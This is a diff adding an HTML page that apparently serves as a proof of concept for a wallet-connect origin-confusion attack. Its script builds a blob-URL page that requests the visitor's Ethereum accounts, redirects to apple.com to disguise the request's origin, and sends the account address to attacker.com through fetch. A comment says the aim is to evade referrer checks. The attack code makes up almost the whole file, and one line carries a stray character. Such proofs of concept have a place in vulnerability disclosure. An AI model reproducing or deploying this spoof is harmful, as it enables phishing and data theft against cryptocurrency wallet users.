@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>dApp Wallet Connect Spoof - Origin Confusion Bypass</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+</head>
+<body>
+  <h2>Simulated dApp Wallet Connect</h2>
+  <button id="connectButton">Connect Wallet</button>
+  <p id="status">Not connected</p>
+
+  <script>
+    async function connectWallet() {
+      if (window.ethereum) {
+        try {
+          // Step 1: Create blob page to handle redirection + spoof
+          const blobPage = `
+            <html><body>
+              <script>
+                const connect = window.ethereum.request({ method: 'eth_requestAccounts' });
+                setTimeout(() => {
+                  location.replace('https://apple.com');
+                }, 150);
+                connect.then(accs => {
+                  fetch('https://attacker.com/log?acc=' + encodeURIComponent(accs[0]));
+                }).catch(console.error);
+              <\/script>
+            </body></html>
+          `;
+
+          // Step 2: Launch blob URL to detach and evade referrer check
+          const blob = new Blob([blobPage], { type: 'text/html' });
+          const blobURL = URL.createObjectURL(blob);x
+
+          const w = window.open(blobURL, '_blank');
+          document.getElementById("status").innerText = "Wallet Connect popup initiated...";
+        } catch (err) {
+          console.error("Connection failed:", err);
+          document.getElementById("status").innerText = "Connection failed";
+        }
+      } else {
+        alert("Web3 provider not detected. Please install OKX, MetaMask, or compatible wallet.");
+      }
+    }
+
+    document.getElementById("connectButton").addEventListener("click", connectWallet);
+  </script>
+</body>
+</html>
